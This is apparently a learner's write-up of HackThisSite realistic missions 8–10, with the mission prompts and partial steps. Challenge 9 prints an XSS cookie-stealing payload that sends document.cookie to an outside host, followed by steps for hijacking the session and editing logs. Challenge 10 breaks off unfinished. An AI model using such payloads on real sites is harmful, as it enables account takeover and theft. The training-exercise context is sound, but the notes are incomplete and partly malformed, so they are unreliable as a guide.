# Challenge 8
## Question
From: DarkOneWithANeed

Message: Hey man, you gotta help me out, Gary Hunter, one of the richest men in America, has just deposited $10,000,000 into his bank account at the United Banks Of America and plans to donate that money to a campaign to hunt down and lock up all hackers. Now I've tried hacking their <a href="https://www.hackthissite.org/missions/realistic/8/">site</a> but I'm just not good enough. That's why I need your help, Here's a list of your objectives:
1. Find the account of Gary Hunter (I don't know his account name).
2. Move the $10,000,000 into the account dropCash.
3. Clear The Logs, They're held in the folder 'logFiles'.
I really hope you can do this, because if you can't we're all screwed

## Solutions

# Challenge 9
## Question
From:

Message: Hey man,
I've heard you're good at hacking, and on the right side of things. So I came looking for you. I really need help, you see, my boss has stopped paying our salaries and I'm going to miss my rent! Please help me get my money, you can reach the site at Crappy Soft. They have an online payment system, but only he can use it. Maybe you can get into his account somehow, but for now you can use mine:

Username: r-conner@crappysoft.com
Password: ilovemywork

Thanks man, good luck.

## Solution
1. Try to login using the credential given by the questions
2. When you observe the website in "Demo", you will realize a path way "./files/..."
3. I try to observe the directories in the website and I realize there is a mailing list
4. I "Private Message" enter these : 

Subject : cookiesstealer.php

Message : javascript:void(window.location="www.yourwebsite.com/cookiestealer.php + document.cookie)

5. Cookies is given, replace the cookies in inspection.

![image](https://github.com/user-attachments/assets/d3d310fe-0542-42a4-98ea-82621adb49fd)

6. Go to "Pay Salaries" to complete the transaction 
7. Go to mailing list, switch the txt files in inspection to logs.txt and paste the IP address.

![image](https://github.com/user-attachments/assets/ca2f8d19-1da1-4253-80d6-6cbd3779e294)

## Cross-Site Scripting (XSS) attack

window.location="www.yourwebsite.com/cookiestealer.php + document.cookie"

# Challenge 10
## Question 

From: Zach Sanchez

Message: hey man, it's me Zach, I need a favour from you, I'm in big trouble.
if you'll remember, I go to that super uptight religious school. well, two of my teachers are failing me because my lifestyle does not fall in line with their moralistic rules for public behaviour. My gym teacher even called me a 'long-haired hippie faggot'! And if I fail any classes, I won't graduate.
Listen, can you hack into the school's grade database and make it so I'm passing all my classes? I know they have this system set up on their website that allows teachers to submit grades and stuff, and I heard you pulled a few things in the past as well. Their web master was not thinking in terms of computer security when he was designing the website, so it might be easy. Or not. Please check it out <a href="http://hackthissite.org/missions/realistic/10/">here</a>. The username to my account is 'Zach Sanchez' and my password is 'liberty638'. Thanks man!

## Solutions
index.php [homepage]
listteachers.php [teacher listing]
student.php [login studnet accounts]
staff.php 

1.  Log into the student account by using the given username and password
2. When we try to look listteacher.php, we realise that "Samantha Miller" has id = 1 --> she is the admin
3. Try to log into Samantha Miller : using the email address "smiller@holycross.edu"
4. 



Ways to create agent in Google Chrome  :

Inspect > Network > More Tools > Network Conditions > User Agent

<img width="1273" alt="image" src="https://github.com/user-attachments/assets/9256391d-bcf9-4829-8b43-4355702b7b6a" />
